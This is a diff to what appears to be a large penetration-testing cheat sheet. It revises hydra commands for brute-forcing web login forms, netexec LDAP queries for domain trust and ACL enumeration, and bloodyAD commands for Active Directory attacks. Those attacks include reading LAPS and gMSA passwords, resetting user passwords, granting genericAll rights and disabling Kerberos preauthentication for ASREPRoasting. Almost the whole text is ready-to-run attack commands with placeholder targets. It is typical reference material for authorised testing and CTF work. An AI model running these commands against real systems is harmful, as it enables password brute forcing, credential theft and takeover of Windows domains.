@@ -3416,11 +3416,12 @@ unset HYDRA_PROXY
 ```
 
 ```shell
-hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
-hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
-hydra <RHOST> -L /PATH/TO/WORDLIST/<FILE> -P /PATH/TO/WORDLIST/<FILE> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
-hydra <RHOST> -l root@localhost -P otrs-cewl.txt http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
-hydra <RHOST> -l admin -P /PATH/TO/WORDLIST/<FILE> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
+hydra -l <USERNAME> -P /PATH/TO/WORDLIST/<WORDLIST> http-get://<RHOST>
+hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<WORDLIST> http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
+hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<WORDLIST> http-post-form "/index.php:username=user&password=^PASS^:Login failed. Invalid"
+hydra <RHOST> -L /PATH/TO/WORDLIST/<WORDLIST> -P /PATH/TO/WORDLIST/<WORDLIST> http-post-form "/login:usernameField=^USER^&passwordField=^PASS^:unsuccessfulMessage" -s <RPORT>
+hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<WORDLIST> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -vV -f
+hydra <RHOST> -l <USERNAME> -P /PATH/TO/WORDLIST/<WORDLIST> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
 ```
 
 #### John the Ripper
@@ -3757,11 +3758,32 @@ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound --dns-tcp --dn
 netexec ldap <RHOST> -u '<USERNAME>' -k --get-sid
 ```
 
+###### Forest Trust Enumeration
+
+```console
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --query '(&(objectClass=trustedDomain)(trustPartner=<DOMAIN>))' 'distinguishedName trustPartner trustDirection trustType trustAttributes securityIdentifier'
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --query '(&(objectClass=trustedDomain)(trustPartner=<DOMAIN>))' 'distinguishedName trustPartner trustDirection trustType trustAttributes securityIdentifier'
+```
+
+```python
+python3 -c 'v=72; print(f"{v} = {v:#x}"); print([name for bit,name in [(0x1,"NON_TRANSITIVE"),(0x2,"UPLEVEL_ONLY"),(0x4,"QUARANTINED"),(0x8,"FOREST_TRANSITIVE"),(0x10,"CROSS_ORGANIZATION"),(0x20,"WITHIN_FOREST"),(0x40,"TREAT_AS_EXTERNAL"),(0x400,"PIM_TRUST")] if v & bit])'
+```
+
+```console
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> --query '(&(objectClass=group)(objectSid=*))' 'sAMAccountName objectSid memberOf'
+```
+
 ###### LDAP Queries
 
 ```shell
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query "(sAMAccountName=Administrator)" ""
-netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query "(sAMAccountName=Administrator)" "sAMAccountName objectClass pwdLastSet"
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query '(sAMAccountName=Administrator)' ''
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query '(sAMAccountName=Administrator)' 'sAMAccountName objectClass pwdLastSet'
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <RHOST> --query '(&(objectClass=organizationalUnit)(ou=<OU>))' 'distinguishedName objectGUID'
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <RHOST> --query '(sAMAccountName=<GROUP>)' 'distinguishedName objectSid member'
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dns-server <RHOST> --query '(sAMAccountName=<USERNAME>)' 'distinguishedName objectSid memberOf'
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M daclread -o TARGET_DN='OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' ACTION=read PRINCIPAL=<GROUP>
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M daclread -o TARGET_DN='OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' ACTION=read PRINCIPAL=<USERNAME>
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --query '(&(objectClass=user)(sAMAccountName=<USERNAME>))' 'distinguishedName sAMAccountName userPrincipalName userAccountControl pwdLastSet'
 ```
 
 ###### Domain Access Control List (DACL) Enumeration
@@ -5526,7 +5548,7 @@ bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<USE
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd                         // Read LAPS password
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                  // Read GMSA account password
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword                           // Read GMSA account password using Kerberos
-bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>' --kerberos --dc-ip <RHOST>        // Set a password for a user
+bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> --kerberos -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>'        // Set a password for a user
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object '<USERNAME>' servicePrincipalName                             // Set a Service Principal Name (SPN)
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName                                      // Set a Service Principal Name (SPN) using Kerberos
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName -v 'cifs/<USERNAME>'                 // Set a Service Principal Name (SPN) using Kerberos
@@ -5539,7 +5561,8 @@ bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> 
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RECORD> <LHOST>                                           // Add a new DNS entry
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<USERNAME>' DONT_REQ_PREAUTH                                    // Enable DONT_REQ_PREAUTH for ASREPRoast
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add uac '<USERNAME>' -f DONT_REQ_PREAUTH                                          // Enable DONT_REQ_PREAUTH for ASREPRoast using Kerberos
-bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add genericAll 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' '<USERNAME>'    // Add genericAll permissions to a specific OU
+bloodyAD --host <RHOST> -i <RHOST> -d <DOMAIN> -u <USERNAME> -k ccache=<FILE>.ccache kdc=<RHOST> add user <USERNAME> '<PASSWORD>' --ou 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>'    // Add user to a specific OU
+bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add genericAll 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' '<USERNAME>'                               // Add genericAll permissions to a specific OU
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove dnsRecord <RECORD> <LHOST>                                        // Remove a DNS entry
 bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac '<USERNAME>' ACCOUNTDISABLE                                   // Disable ACCOUNTDISABLE (enable account)
 bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k remove uac '<USERNAME>' -f ACCOUNTDISABLE                                         // Disable ACCOUNTDISABLE (enable account) using Kerberos
